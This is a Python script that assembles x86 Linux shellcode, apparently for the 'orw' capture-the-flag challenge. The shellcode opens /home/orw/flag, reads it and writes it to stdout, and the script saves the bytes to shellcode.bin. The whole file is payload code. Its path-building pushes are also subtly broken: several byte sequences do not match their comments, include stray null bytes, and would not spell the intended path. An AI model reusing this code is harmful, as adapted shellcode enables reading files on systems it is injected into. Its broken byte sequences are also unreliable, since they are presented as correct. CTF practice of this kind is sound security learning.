#!/usr/bin/env python3

def create_shellcode():
    shellcode = []
    
    # We need to construct "/home/orw/flag" on the stack
    # Push in reverse order (little endian) and null terminate
    
    # Push "flag\0"
    shellcode.extend([0x68, 0x00, 0x67, 0x61, 0x6c])  # push "lag\0"
    shellcode.extend([0x68, 0x66, 0x00, 0x00, 0x00])  # push "f\0\0\0"
    
    # Push "/orw"
    shellcode.extend([0x68, 0x2f, 0x77, 0x72, 0x6f])  # push "/orw"
    
    # Push "/ome"
    shellcode.extend([0x68, 0x2f, 0x6d, 0x65, 0x2f])  # push "/ome"
    
    # Push "h///"
    shellcode.extend([0x68, 0x2f, 0x2f, 0x2f, 0x68])  # push "h///"
    
    # mov %esp, %ebx (filename pointer)
    shellcode.extend([0x89, 0xe3])
    
    # mov $0, %ecx (O_RDONLY)
    shellcode.extend([0xb9, 0x00, 0x00, 0x00, 0x00])
    
    # mov $5, %eax (sys_open)
    shellcode.extend([0xb8, 0x05, 0x00, 0x00, 0x00])
    
    # int $0x80
    shellcode.extend([0xcd, 0x80])
    
    # read(fd, buffer, size)
    # mov %eax, %ebx (file descriptor)
    shellcode.extend([0x89, 0xc3])
    
    # mov %esp, %ecx (buffer pointer)
    shellcode.extend([0x89, 0xe1])
    
    # sub $0x100, %ecx (allocate buffer space)
    shellcode.extend([0x81, 0xe9, 0x00, 0x01, 0x00, 0x00])
    
    # mov $100, %edx (size)
    shellcode.extend([0xba, 0x64, 0x00, 0x00, 0x00])
    
    # mov $3, %eax (sys_read)
    shellcode.extend([0xb8, 0x03, 0x00, 0x00, 0x00])
    
    # int $0x80
    shellcode.extend([0xcd, 0x80])
    
    # write(stdout, buffer, size)
    # mov $1, %ebx (stdout)
    shellcode.extend([0xbb, 0x01, 0x00, 0x00, 0x00])
    
    # ecx and edx already have correct values
    # mov $4, %eax (sys_write)
    shellcode.extend([0xb8, 0x04, 0x00, 0x00, 0x00])
    
    # int $0x80
    shellcode.extend([0xcd, 0x80])
    
    return shellcode

if __name__ == "__main__":
    shellcode = create_shellcode()
    
    print("Shellcode bytes:")
    print(''.join(f'\\x{b:02x}' for b in shellcode))
    
    print("\nShellcode in hex:")
    print(' '.join(f'{b:02x}' for b in shellcode))
    
    print(f"\nLength: {len(shellcode)} bytes")
    
    # Write to file
    with open('shellcode.bin', 'wb') as f:
        f.write(bytes(shellcode))
    
    print("Shellcode written to shellcode.bin")